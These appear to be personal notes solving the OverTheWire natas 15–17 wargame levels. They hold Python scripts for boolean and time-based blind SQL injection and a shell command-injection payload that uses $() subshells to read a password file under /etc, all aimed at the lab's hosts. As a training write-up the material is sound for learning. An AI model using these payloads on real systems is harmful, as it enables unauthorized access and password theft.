# CTF Notes

### natas15
From the natas15 challenge. This is an SQL bruteforce where if the character exsists in the password, it will print "exists". Because of the output we can check whether or not we are correct through checkin if "exists" is in the content body of the response. using `requests` this can be done quite easily. The SQL query uses LIKE BINARY which is case-sensitive in order to get the correct values.

The second for loop in the script cycles 32 times (typical length of the password) and matches the exact places. %{}% matches if present in any position. {}% matches if its at the beginning (in this case to brute force the correct order). Therefore %{} would match if character was at the end.

```py
import requests
from requests.auth import HTTPBasicAuth

chars = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered = ""
passwd = ""

for char in chars:
    input_data = {'username' : 'natas16" and password LIKE BINARY "%{}%" # '.format(char)}
    r = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug", auth=HTTPBasicAuth('natas15', '<censored>'), data = input_data)
    if "exists" in r.text:
        filtered += char

print(filtered)

for _ in range(0, 32):
    for char in filtered:
        input_data = {'username' : 'natas16" and password LIKE BINARY "{}%" # '.format(passwd + char)}
        r = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug", auth=HTTPBasicAuth('natas15', '<censored>'), data = input_data)
        if "exists" in r.text:
            passwd += char
            print(passwd)
            break
```
### natas16

Another brute force though not using SQL injection. There is a filter on common escape sequences (dunno what theyre called) but not on $(). This creates a subshell which can be used to run a command. There are 2 ways to solve this, one of them I do not really understand but oh well. I think prints the file to standard output `$(cat /etc/natas_webpass/natas17 > /proc/$$/fd/1)` $$ is the process id of the bash shell and /fd/1 is the standard ouput. So when running the command it is as if running the command not through a subshell.
 
The other method is a bruteforce. by grepping a single character through a subshell we can determine whether it exists in the password. By adding a word directly at the end of the sub-shell command we can determine whether the character is present by checking the response for that word. Example: `grep -i $(grep a /etc/natas_webpass/natas17)doomed dictionary.txt` if `a` was present in the password, it will result in `grep -i adoomed dictionary.txt` being executed by the server. `adoomed` is not a word and therefore would not match. If we use a script to cycle through each potential character and check everytime `doomed` is not present in the response, we would that the character is in the password. Script below.

```py
import requests
from requests.auth import HTTPBasicAuth

chars = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered = ""
passwd = ""

for char in chars:
    input_data = {'needle': '$(grep {} /etc/natas_webpass/natas17)doomed'.format(char),'submit' : 'Search'}
    r = requests.get("http://natas16.natas.labs.overthewire.org/", auth=HTTPBasicAuth('natas16', '<censored>'), params=input_data)
    if "Output:\n<pre>\n</pre>" in r.text:
        filtered += char

print(filtered)

for _ in range(0, 32):
    for char in filtered:
        input_data = {'needle': '$(grep ^{} /etc/natas_webpass/natas17)doomed'.format(passwd + char),'submit' : 'Search'}
        r = requests.get("http://natas16.natas.labs.overthewire.org/", auth=HTTPBasicAuth('natas16', '<censored>'), params=input_data)
        if "Output:\n<pre>\n</pre>" in r.text:
            passwd += char
            print(passwd,'*' * int(32 - len(passwd)))
            break
```   

### natas17

source: https://www.abatchy.com/2016/12/natas-level-17
From the natas17 challenge. Bruteforce password through SQL injection though there is not output. If there is no output use the `AND sleep()` command in the query to control the response time. If the query was correct i.e char is in there, the `sleep()` will trigger and the response time will be slower. This can be checked in python using `requests`.

```py
import requests
from requests.auth import HTTPBasicAuth

url = "http://natas17.natas.labs.overthewire.org/index.php?debug"
auth_user = "natas17"
auth_pass = "<censored>"

chars = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered = ""
passwd = ""


for char in chars: # checks which characters are in the password
    # if the query is successful it will add a 1 second relay
    input_data = {"username": 'natas18" and password LIKE BINARY "%{}%" AND sleep(1) # '.format(char)}
    r = requests.post(url, auth=HTTPBasicAuth(auth_user, auth_pass), data=input_data)
    if "01." in str(r.elapsed): # "01." specifies that the response took 1 second, from sleep(), can increase if network is slower
        print(r.elapsed, char)
        filtered += char

```
